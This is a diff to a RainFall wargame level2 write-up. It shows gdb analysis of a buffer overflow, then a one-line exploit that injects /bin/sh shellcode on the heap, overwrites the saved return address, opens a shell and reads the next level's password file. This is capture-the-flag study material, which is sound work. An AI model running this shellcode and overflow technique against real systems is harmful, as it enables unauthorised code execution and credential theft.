@@ -37,13 +37,16 @@ level2@RainFall:~$ gdb ./level2
 0x080484d4  p
 0x0804853f  main
 [...]
+```
+`p()` gets a line from a stream `+25` and save a copy of a string on heap `+100`.
+```gdb
 (gdb) disassemble p
 Dump of assembler code for function p:
-   0x080484d4 <+0>:	push   %ebp		# Prologue
-   0x080484d5 <+1>:	mov    %esp,%ebp		# Prologue
-   0x080484d7 <+3>:	sub    $0x68,%esp		# Allocate space 104 bits to char[76] and uint
-   0x080484da <+6>:	mov    0x8049860,%eax		# Put address of stdout into EAX
-   0x080484df <+11>:	mov    %eax,(%esp)		# Dereference the value held in EAX (copies 32 bit value from memory to EAX)
+   0x080484d4 <+0>:	push   %ebp
+   0x080484d5 <+1>:	mov    %esp,%ebp
+   0x080484d7 <+3>:	sub    $0x68,%esp
+   0x080484da <+6>:	mov    0x8049860,%eax
+   0x080484df <+11>:	mov    %eax,(%esp)
    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
    0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
    0x080484ea <+22>:	mov    %eax,(%esp)
@@ -69,4 +72,76 @@ Dump of assembler code for function p:
    0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
    0x0804853d <+105>:	leave
    0x0804853e <+106>:	ret
+End of assembler dump.
+(gdb) break *p+105
+Breakpoint 1 at 0x804853d
+```
+Run executable with recognazible pattern to fill array.
+```gdb
+(gdb) run <<< $(python -c "print 'A' * 64")
+Starting program: /home/user/level2/level2 <<< $(python -c "print 'A' * 64")
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ����
+
+Breakpoint 1, 0x0804853d in p ()
+(gdb) x/32wx $esp
+0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
+0xbffff6d0:	0x080482b5	0x00000000	0x00c30000	0x41414141
+0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff710:	0x41414141	0x41414141	0x41414141	0x0804854a
+0xbffff720:	0xb7fed280	0x00000000	0xbffff738	0x0804854a
+0xbffff730:	0x08048550	0x00000000	0x00000000	0xb7e454d3
+```
+Determine HEAP address and check that string was copied into.
+```gdb
+(gdb) info proc mappings
+process 3338
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+	 0x804a000  0x806b000    0x21000        0x0 [heap]
+	0xb7e2b000 0xb7e2c000     0x1000        0x0
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0
+	0xb7fd9000 0xb7fdd000     0x4000        0x0
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) x/32wx 0x804a000
+0x804a000:	0x00000000	0x00000051	0x41414141	0x41414141
+0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a040:	0x41414141	0x41414141	0x0804854a	0xb7fed280
+0x804a050:	0x00000000	0x00020fb1	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+As NX is disabled, put a shellcode on HEAP and ovewrite EIP so that it holds HEAPs address. 
+```gdb
+(gdb) info frame
+Stack level 0, frame at 0xbffff730:
+ eip = 0x804853d in p; saved eip 0x804854a
+ called by frame at 0xbffff740
+ Arglist at 0xbffff728, args:
+ Locals at 0xbffff728, Previous frame's sp is 0xbffff730
+ Saved registers:
+  ebp at 0xbffff728, eip at 0xbffff72c
+```
+At this point in time, it might be easier to use someone elses shellcode. So, refering to shellcodes database for study cases, choose a simple one [811](http://shell-storm.org/shellcode/files/shellcode-811.php).
+```shell
+level2@RainFall:~$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm' + '\x08\xa0\x04\x08'"; cat -)  | ./level2
+1�Ph//shh/bin����°
+                   ̀1�@̀aaaabbbbccccddddeeeeffffgggghhhhiiikkkkllllmmm�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
